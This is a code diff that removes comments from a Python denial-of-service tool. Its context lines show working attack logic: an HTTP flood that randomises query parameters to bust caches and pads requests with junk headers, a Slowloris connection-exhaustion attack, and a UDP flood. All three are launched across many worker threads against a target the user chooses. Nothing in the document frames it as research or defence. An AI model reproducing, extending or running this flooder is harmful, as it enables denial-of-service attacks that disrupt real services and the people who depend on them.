@@ -12,10 +12,10 @@ import struct
 from concurrent.futures import ThreadPoolExecutor
 import urllib.parse
 
-# Initialize colorama
+
 init(autoreset=True)
 
-# Global counters
+
 requests_sent = 0
 bytes_sent = 0
 errors = 0
@@ -451,7 +451,7 @@ def massive_http_flood(session, target_url, method, rate, delay):
     
     while True:
         try:
-            # Randomize query params for cache busting
+           
             query = f"?q={rand_string(15)}&t={random.randint(1,999999)}"
             url = f"{target_url.rstrip('/')}{path}{query}"
             
@@ -467,7 +467,7 @@ def massive_http_flood(session, target_url, method, rate, delay):
                 'X-Flooder': f'Bot-{random.randint(1000,9999)}',
             }
             
-            # Header bloat (Slowloris L7)
+        
             for i in range(20):
                 headers[f'X-Junk-{rand_string(6)}'] = rand_string(25)
             
@@ -536,26 +536,26 @@ def main():
     print(f"{Fore.YELLOW}Workers: {args.workers:,} | Method: {args.method} | Rate: {args.rate}rps | Delay: {args.delay}s")
     print(f"{Fore.WHITE}Press Ctrl+C to stop...\n")
     
-    # Stats thread
+   
     stats_thread = threading.Thread(target=print_stats, daemon=True)
     stats_thread.start()
     
     time.sleep(2)
     
-    # Create session pool
+   
     sessions = [create_session() for _ in range(args.workers // 10)]
     
     with ThreadPoolExecutor(max_workers=args.workers) as executor:
-        # HTTP Flood (main L7 attack)
+        
         for i in range(args.workers):
             session = sessions[i % len(sessions)]
             executor.submit(massive_http_flood, session, args.target, args.method, args.rate, args.delay)
         
-        # Slowloris (connection exhaustion)
+        
         for i in range(args.workers // 5):
             executor.submit(slowloris_attack, target_host, target_port)
         
-        # UDP Flood (L4)
+        
         for i in range(args.workers // 10):
             executor.submit(udp_flood, target_host, target_port)
     
